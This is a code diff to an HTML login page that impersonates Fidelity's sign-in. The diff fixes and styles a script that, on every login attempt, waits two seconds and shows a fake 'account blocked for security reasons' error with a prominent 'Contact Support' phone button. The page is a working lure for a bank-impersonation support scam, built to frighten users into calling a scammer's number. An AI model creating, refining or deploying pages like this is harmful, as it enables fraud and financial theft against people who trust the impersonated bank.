@@ -40,7 +40,7 @@
         .header-links a {
             text-decoration: none;
             color: #4B4B4B;
-            margin-left: 20px; /* Spacing between links */
+            margin-left: 20px;
             margin-right: 20px;
         }
 
@@ -53,10 +53,10 @@
             padding: 40px;
             border-radius: 8px;
             box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-            width: 90%; /* Full width for mobile */
-            max-width: 400px; /* Max width for desktop */
+            width: 90%;
+            max-width: 400px;
             text-align: center;
-            margin-top: 60px; /* Adjust margin for header */
+            margin-top: 60px;
         }
 
         .container h2 {
@@ -135,26 +135,43 @@
             color: red;
             margin-top: 10px;
             font-size: 14px;
+            background-color: #f8d7da;
+            padding: 10px;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
         }
 
-        /* Media Queries for Responsiveness */
+        .error a {
+            color: #155724;
+            text-decoration: none;
+            background-color: #28a745;
+            padding: 10px 15px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .error a:hover {
+            text-decoration: underline;
+        }
+
         @media (max-width: 600px) {
             header {
                 padding: 10px 15px;
             }
 
             .header-links a {
-                margin-left: 10px; /* Less spacing on mobile */
+                margin-left: 10px;
                 margin-right: 10px;
             }
 
             .container {
-                padding: 20px; /* Less padding on mobile */
+                padding: 20px;
             }
 
             .login-btn {
-                padding: 10px; /* Smaller button on mobile */
-                font-size: 14px; /* Smaller font on mobile */
+                padding: 10px;
+                font-size: 14px;
             }
         }
     </style>
@@ -182,7 +199,7 @@
             <div class="form-group">
                 <label for="password">Password</label>
                 <input type="password" id="password" name="password" placeholder="Password">
-                <div id="error-message" class="error"></div> <!-- Error message block -->
+                <div id="error-message" class="error" style="display:none;"></div>
             </div>
             <div class="form-group">
                 <input type="checkbox" id="remember" name="remember">
@@ -195,13 +212,12 @@
         </form>
     </div>
 
-    <!-- Signup link outside the container -->
     <div class="signup-link">
         New to Fidelity? <a href="#">Open an account or sign up.</a>
     </div>
 
-        <script>
-        // Function to save username to localStorage if "Remember my username" is checked
+    <script>
+        // Save username to localStorage if "Remember my username" is checked
         function saveUsername() {
             const username = document.getElementById('username').value;
             const remember = document.getElementById('remember').checked;
@@ -213,7 +229,7 @@
             }
         }
 
-        // Function to populate the username field if it was remembered
+        // Populate the username field if remembered
         function loadRememberedUsername() {
             const rememberedUsername = localStorage.getItem('rememberedUsername');
             if (rememberedUsername) {
@@ -225,8 +241,8 @@
         // Show error message on login attempt
         function showErrorMessage() {
             const errorMessage = document.getElementById('error-message');
-            errorMessage.innerHTML = 'Error Code : 00X47800. <br> Your account has been blocked due to security reasons. <br> Contact Support : +1-844-499-1812';
-            <a href="tel:+18444991812" style="background-color: #28a745; color: white; padding: 10px 15px; border-radius: 5px; text-decoration: none;">+1-844-499-1812</a>`;
+            errorMessage.style.display = 'block';
+            errorMessage.innerHTML = 'Error Code : 00X47800. <br> Your account has been blocked due to security reasons. <br> Contact Support: <a href="tel:+18444991812">+1-844-499-1812</a>';
         }
 
         // Handle form submission
@@ -236,9 +252,9 @@
             // Show error message after 2 seconds
             setTimeout(function() {
                 showErrorMessage();
-            }, 2000); // 2000ms = 2 seconds
+            }, 2000);
 
-            // Save the username if remember is checked
+            // Save the username if "Remember" is checked
             saveUsername();
         });
 
@@ -247,6 +263,5 @@
             loadRememberedUsername();
         };
     </script>
-
 </body>
 </html>
